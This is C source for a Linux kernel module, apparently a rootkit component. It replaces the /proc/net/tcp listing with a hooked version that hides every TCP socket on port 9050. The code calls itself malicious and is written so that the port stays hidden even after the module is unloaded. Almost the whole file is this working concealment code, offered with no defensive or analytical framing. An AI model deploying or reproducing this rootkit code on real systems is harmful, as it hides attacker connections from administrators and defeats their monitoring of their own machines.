#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/types.h>
#include <net/tcp.h>
#include <net/net_namespace.h>

#define TMPSZ 150
#define TCP_PINGPONG_THRESH 3

static inline bool our_inet_csk_in_pingpong_mode(struct sock *sk)
{
	return inet_csk(sk)->icsk_ack.pingpong >= TCP_PINGPONG_THRESH;
}

static void get_openreq4(const struct request_sock *req,
			 struct seq_file *f, int i)
{
	const struct inet_request_sock *ireq = inet_rsk(req);
	long delta = req->rsk_timer.expires - jiffies;

	seq_printf(f, "%4d: %08X:%04X %08X:%04X"
		" %02X %08X:%08X %02X:%08lX %08X %5u %8d %u %d %pK",
		i,
		ireq->ir_loc_addr,
		ireq->ir_num,
		ireq->ir_rmt_addr,
		ntohs(ireq->ir_rmt_port),
		TCP_SYN_RECV,
		0, 0, /* could print option size, but that is af dependent. */
		1,    /* timers active (only the expire timer) */
		jiffies_delta_to_clock_t(delta),
		req->num_timeout,
		from_kuid_munged(seq_user_ns(f),
				 sock_i_uid(req->rsk_listener)),
		0,  /* non standard timer */
		0, /* open_requests have no inode */
		0,
		req);
}

static void get_tcp4_sock(struct sock *sk, struct seq_file *f, int i)
{
	int timer_active;
	unsigned long timer_expires;
	const struct tcp_sock *tp = tcp_sk(sk);
	const struct inet_connection_sock *icsk = inet_csk(sk);
	const struct inet_sock *inet = inet_sk(sk);
	const struct fastopen_queue *fastopenq = &icsk->icsk_accept_queue.fastopenq;
	__be32 dest = inet->inet_daddr;
	__be32 src = inet->inet_rcv_saddr;
	__u16 destp = ntohs(inet->inet_dport);
	__u16 srcp = ntohs(inet->inet_sport);
	int rx_queue;
	int state;

	if (icsk->icsk_pending == ICSK_TIME_RETRANS ||
	    icsk->icsk_pending == ICSK_TIME_REO_TIMEOUT ||
	    icsk->icsk_pending == ICSK_TIME_LOSS_PROBE) {
		timer_active	= 1;
		timer_expires	= icsk->icsk_timeout;
	} else if (icsk->icsk_pending == ICSK_TIME_PROBE0) {
		timer_active	= 4;
		timer_expires	= icsk->icsk_timeout;
	} else if (timer_pending(&sk->sk_timer)) {
		timer_active	= 2;
		timer_expires	= sk->sk_timer.expires;
	} else {
		timer_active	= 0;
		timer_expires = jiffies;
	}

	state = inet_sk_state_load(sk);
	if (state == TCP_LISTEN)
		rx_queue = sk->sk_ack_backlog;
	else
		/* Because we don't lock the socket,
		 * we might find a transient negative value.
		 */
		rx_queue = max_t(int, READ_ONCE(tp->rcv_nxt) -
				      READ_ONCE(tp->copied_seq), 0);

	seq_printf(f, "%4d: %08X:%04X %08X:%04X %02X %08X:%08X %02X:%08lX "
			"%08X %5u %8d %lu %d %pK %lu %lu %u %u %d",
		i, src, srcp, dest, destp, state,
		READ_ONCE(tp->write_seq) - tp->snd_una,
		rx_queue,
		timer_active,
		jiffies_delta_to_clock_t(timer_expires - jiffies),
		icsk->icsk_retransmits,
		from_kuid_munged(seq_user_ns(f), sock_i_uid(sk)),
		icsk->icsk_probes_out,
		sock_i_ino(sk),
		refcount_read(&sk->sk_refcnt), sk,
		jiffies_to_clock_t(icsk->icsk_rto),
		jiffies_to_clock_t(icsk->icsk_ack.ato),
		(icsk->icsk_ack.quick << 1) | our_inet_csk_in_pingpong_mode(sk),
		tp->snd_cwnd,
		state == TCP_LISTEN ?
		    fastopenq->max_qlen :
		    (tcp_in_initial_slowstart(tp) ? -1 : tp->snd_ssthresh));
}

static void get_timewait4_sock(const struct inet_timewait_sock *tw,
			       struct seq_file *f, int i)
{
	long delta = tw->tw_timer.expires - jiffies;
	__be32 dest, src;
	__u16 destp, srcp;

	dest  = tw->tw_daddr;
	src   = tw->tw_rcv_saddr;
	destp = ntohs(tw->tw_dport);
	srcp  = ntohs(tw->tw_sport);

	seq_printf(f, "%4d: %08X:%04X %08X:%04X"
		" %02X %08X:%08X %02X:%08lX %08X %5d %8d %d %d %pK",
		i, src, srcp, dest, destp, tw->tw_substate, 0, 0,
		3, jiffies_delta_to_clock_t(delta), 0, 0, 0, 0,
		refcount_read(&tw->tw_refcnt), tw);
}

static int original_tcp4_seq_show(struct seq_file *seq, void *v)
{
	struct tcp_iter_state *st;
	struct sock *sk = v;

	seq_setwidth(seq, TMPSZ - 1);
	if (v == SEQ_START_TOKEN) {
		seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
			   "rx_queue tr tm->when retrnsmt   uid  timeout "
			   "inode");
		goto out;
	}
	st = seq->private;

	if (sk->sk_state == TCP_TIME_WAIT)
		get_timewait4_sock(v, seq, st->num);
	else if (sk->sk_state == TCP_NEW_SYN_RECV)
		get_openreq4(v, seq, st->num);
	else
		get_tcp4_sock(v, seq, st->num);
out:
	seq_pad(seq, '\n');
	return 0;
}

// Original function from the kernel "tcp4_seq_show"
static int hooked_tcp4_seq_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v)
		return original_tcp4_seq_show(m, v);

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if (port == 9050)
		return 0;

	return original_tcp4_seq_show(m, v);
}


// In this struct we will insert our malicious code
// in the show function, therefore replacing "tcp4_seq_show"
static const struct seq_operations new_tcp_seq_ops = {
	.show = hooked_tcp4_seq_show,
	.start = tcp_seq_start,
	.next = tcp_seq_next,
	.stop = tcp_seq_stop,
};

// We declare the family of the ports we will hide
// tcp in our case.
static struct tcp_seq_afinfo new_tcp_seq_afinfo = {
	.family = AF_INET,
};

// This does the same as "tcp4_proc_init_net" function from the
// kernel, but we are deleting the previous sequential file and
// creating a new one in which we are filtering out the ports we
// want.
static __net_init int new_net_init(struct net *net)
{
	remove_proc_entry("tcp", net->proc_net);
	if (!proc_create_net_data("tcp",
				  0444,
				  net->proc_net,
				  &new_tcp_seq_ops, 
				  sizeof(struct tcp_iter_state),
				  &new_tcp_seq_afinfo))
		return -ENOMEM;

	return 0;
}

// If the lkm is removed for some reason. We do not want
// to do nothing. We will not remove the file.
// This means, that the port will continue being hidden.
static __net_exit void new_net_exit(struct net *net)
{
}

// Swap init and exit functions with our own functions
static struct pernet_operations new_net_ops = { 
	.init = new_net_init,
	.exit = new_net_exit,
};

// Register a network namespace subsystem
// with our malicious functions
static int __init hide_ports(void)
{
	return register_pernet_subsys(&new_net_ops);
}

// Remove network namespace
// Not needed
static void __init unhide_ports(void)
{
	unregister_pernet_subsys(&new_net_ops);
}
